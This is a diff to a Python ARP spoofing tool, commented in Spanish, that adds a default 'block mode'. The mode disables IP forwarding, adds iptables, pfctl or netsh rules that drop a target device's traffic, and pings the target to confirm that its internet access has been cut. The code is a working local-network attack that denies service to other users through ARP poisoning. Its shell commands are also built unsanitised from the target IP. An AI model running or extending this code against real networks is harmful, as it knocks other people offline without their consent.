@@ -32,6 +32,7 @@ class ARPSpoofer:
         self.ip_forward_original_state = None
         self.packet_rate = 0.5  # Intervalo más corto entre paquetes (0.5 segundos)
         self.aggressive_mode = True  # Modo agresivo activado por defecto
+        self.block_mode = True  # Modo de bloqueo real activado por defecto
     
     def set_status_callback(self, callback: Callable[[str, str, bool], None]):
         """
@@ -63,6 +64,15 @@ class ARPSpoofer:
             enabled: True para activar el modo agresivo
         """
         self.aggressive_mode = enabled
+    
+    def set_block_mode(self, enabled: bool):
+        """
+        Activa o desactiva el modo de bloqueo real
+        
+        Args:
+            enabled: True para activar el bloqueo real de tráfico
+        """
+        self.block_mode = enabled
     
     def _get_mac(self, ip: str) -> Optional[str]:
         """Obtiene la dirección MAC de un dispositivo dada su IP"""
@@ -119,6 +129,86 @@ class ARPSpoofer:
             self._report_status("system", f"Error al habilitar IP forwarding: {e}", False)
         return False
     
+    def _disable_ip_forwarding(self) -> bool:
+        """
+        Deshabilita el reenvío de IP para bloquear el tráfico
+        Retorna True si se pudo deshabilitar correctamente
+        """
+        try:
+            system = platform.system()
+            if system == "Linux":
+                # Guardar el estado original si no se ha hecho ya
+                if self.ip_forward_original_state is None:
+                    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
+                        self.ip_forward_original_state = f.read().strip()
+                # Deshabilitar IP forwarding
+                cmd = "echo 0 > /proc/sys/net/ipv4/ip_forward"
+                subprocess.run(cmd, shell=True, check=True)
+                self._report_status("system", "IP forwarding deshabilitado para bloquear tráfico", True)
+                return True
+            elif system == "Darwin":  # macOS
+                # Guardar el estado original
+                if self.ip_forward_original_state is None:
+                    result = subprocess.run(["sysctl", "net.inet.ip.forwarding"], capture_output=True, text=True)
+                    self.ip_forward_original_state = result.stdout.strip().split(":")[-1].strip()
+                # Deshabilitar IP forwarding
+                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"], check=True)
+                self._report_status("system", "IP forwarding deshabilitado para bloquear tráfico", True)
+                return True
+            elif system == "Windows":
+                # En Windows, necesitamos otro enfoque
+                self._report_status("system", "La gestión de IP forwarding no está implementada para Windows", False)
+                return False
+        except Exception as e:
+            self._report_status("system", f"Error al deshabilitar IP forwarding: {e}", False)
+        return False
+    
+    def _setup_firewall_rules(self, target_ip: str) -> bool:
+        """
+        Configura reglas de firewall para descartar paquetes del IP objetivo
+        Retorna True si se configuró correctamente
+        """
+        try:
+            system = platform.system()
+            if system == "Linux":
+                # Usar iptables para descartar paquetes del IP objetivo
+                cmd = f"iptables -A FORWARD -s {target_ip} -j DROP"
+                subprocess.run(cmd, shell=True, check=True)
+                self._report_status("system", f"Regla de firewall agregada para bloquear {target_ip}", True)
+                return True
+            elif system == "Darwin":  # macOS
+                # Usar pfctl para macOS (simplificado)
+                cmd = f"echo 'block drop from {target_ip} to any' | sudo pfctl -ef -"
+                subprocess.run(cmd, shell=True, check=True)
+                self._report_status("system", f"Regla de firewall agregada para bloquear {target_ip}", True)
+                return True
+            elif system == "Windows":
+                # Usar netsh para Windows (simplificado)
+                cmd = f'netsh advfirewall firewall add rule name="Block {target_ip}" dir=out action=block remoteip={target_ip}'
+                subprocess.run(cmd, shell=True, check=True)
+                self._report_status("system", f"Regla de firewall agregada para bloquear {target_ip}", True)
+                return True
+        except Exception as e:
+            self._report_status("system", f"Error al configurar reglas de firewall: {e}", False)
+        return False
+    
+    def _remove_firewall_rules(self, target_ip: str):
+        """Elimina las reglas de firewall para el IP objetivo"""
+        try:
+            system = platform.system()
+            if system == "Linux":
+                cmd = f"iptables -D FORWARD -s {target_ip} -j DROP"
+                subprocess.run(cmd, shell=True, check=True)
+            elif system == "Darwin":  # macOS
+                # Para macOS, esto requeriría una gestión más compleja de pfctl
+                pass
+            elif system == "Windows":
+                cmd = f'netsh advfirewall firewall delete rule name="Block {target_ip}"'
+                subprocess.run(cmd, shell=True, check=True)
+            self._report_status("system", f"Regla de firewall eliminada para {target_ip}", True)
+        except Exception as e:
+            self._report_status("system", f"Error al eliminar reglas de firewall: {e}", False)
+    
     def _restore_ip_forwarding(self):
         """Restaura la configuración original de reenvío de IP"""
         if self.ip_forward_original_state is None:
@@ -131,6 +221,7 @@ class ARPSpoofer:
                 subprocess.run(cmd, shell=True, check=True)
             elif system == "Darwin":  # macOS
                 subprocess.run(["sysctl", "-w", f"net.inet.ip.forwarding={self.ip_forward_original_state}"], check=True)
+            self._report_status("system", "Configuración de IP forwarding restaurada", True)
         except Exception as e:
             self._report_status("system", f"Error al restaurar IP forwarding: {e}", False)
     
@@ -293,6 +384,48 @@ class ARPSpoofer:
         except Exception as e:
             self._report_status(target_ip, f"Error al restaurar la conexión: {e}", False)
     
+    def _verify_blocking(self, target_ip: str):
+        """Verifica que el bloqueo está funcionando para el IP objetivo"""
+        # Esperar un poco para que el spoofing tenga efecto
+        time.sleep(5)
+        
+        # Solo continuar si aún está activo
+        if not (target_ip in self.targets and self.targets[target_ip].get('running', False)):
+            return
+        
+        # Intentar hacer ping al objetivo para ver si está alcanzable
+        try:
+            system = platform.system()
+            ping_param = "-n 1" if system == "Windows" else "-c 1"
+            cmd = f"ping {ping_param} {target_ip}"
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            
+            # Verificar si el ping fue exitoso
+            ping_success = "ttl=" in result.stdout.lower() or "time=" in result.stdout.lower()
+            
+            if ping_success:
+                self._report_status(
+                    target_ip, 
+                    "Verificación: El dispositivo sigue siendo accesible localmente (normal)."
+                )
+                
+                # Intentar verificar si el dispositivo bloqueado puede acceder a internet
+                # Este método es aproximado y puede no ser 100% preciso
+                self._report_status(
+                    target_ip, 
+                    "El dispositivo objetivo debería tener su acceso a internet bloqueado. " + 
+                    "Verifique en el dispositivo si puede navegar por internet."
+                )
+            else:
+                self._report_status(
+                    target_ip, 
+                    "Verificación: No se puede hacer ping al dispositivo. Esto podría significar " + 
+                    "que el bloqueo es muy efectivo o que el dispositivo está apagado."
+                )
+                
+        except Exception as e:
+            self._report_status(target_ip, f"Error al verificar el bloqueo: {e}", False)
+    
     def start_spoofing(self, target_ip: str) -> bool:
         """
         Inicia el ARP Spoofing para un objetivo
@@ -308,8 +441,14 @@ class ARPSpoofer:
             self._report_status(target_ip, "La restricción ya está activa", True)
             return True
         
-        # Habilitar IP forwarding si es necesario
-        if self.aggressive_mode:
+        # Configurar el reenvío de IP según el modo de bloqueo
+        if self.block_mode:
+            # Para bloqueo real, necesitamos DESHABILITAR el reenvío de IP
+            self._disable_ip_forwarding()
+            # Y configurar reglas de firewall
+            self._setup_firewall_rules(target_ip)
+        else:
+            # Para modo de monitorización (sin bloqueo), habilitar reenvío de IP
             self._enable_ip_forwarding()
         
         # Obtener MAC del objetivo
@@ -330,11 +469,23 @@ class ARPSpoofer:
             'mac': target_mac,
             'thread': spoof_thread,
             'running': True,
-            'start_time': time.time()
+            'start_time': time.time(),
+            'block_mode': self.block_mode  # Guardar modo de bloqueo actual para este objetivo
         }
         
         # Iniciar el hilo
         spoof_thread.start()
+        
+        # Verificar bloqueo si estamos en modo de bloqueo real
+        if self.block_mode:
+            # Programar verificación después de un breve retraso
+            verification_thread = threading.Thread(
+                target=self._verify_blocking,
+                args=(target_ip,),
+                daemon=True
+            )
+            verification_thread.start()
+        
         self._report_status(target_ip, f"Restricción de acceso iniciada correctamente. MAC objetivo: {target_mac}")
         return True
     
@@ -352,6 +503,9 @@ class ARPSpoofer:
             self._report_status(target_ip, "El objetivo no está siendo restringido", False)
             return False
         
+        # Verificar si este objetivo estaba en modo de bloqueo
+        block_mode = self.targets[target_ip].get('block_mode', False)
+        
         # Marcar para detener
         self.targets[target_ip]['running'] = False
         
@@ -362,11 +516,15 @@ class ARPSpoofer:
         # Eliminar de la lista
         target_info = self.targets.pop(target_ip, None)
         
+        # Si estaba en modo de bloqueo, eliminar reglas de firewall
+        if block_mode:
+            self._remove_firewall_rules(target_ip)
+        
         # Si no se restauró por alguna razón, intentar restaurar manualmente
         if target_info and 'mac' in target_info:
             self._restore_connection(target_ip, target_info['mac'])
         
-        # Si no quedan objetivos activos, restaurar IP forwarding
+        # Si no quedan objetivos activos, restaurar reenvío de IP
         if not any(t.get('running', False) for t in self.targets.values()):
             self._restore_ip_forwarding()
         
@@ -395,7 +553,8 @@ class ARPSpoofer:
         return {ip: {
             'mac': info['mac'],
             'duration': time.time() - info.get('start_time', time.time()),
-            'active': info.get('running', False)
+            'active': info.get('running', False),
+            'block_mode': info.get('block_mode', False)
         } for ip, info in self.targets.items() if info.get('running', False)}
     
     def stop_all(self):
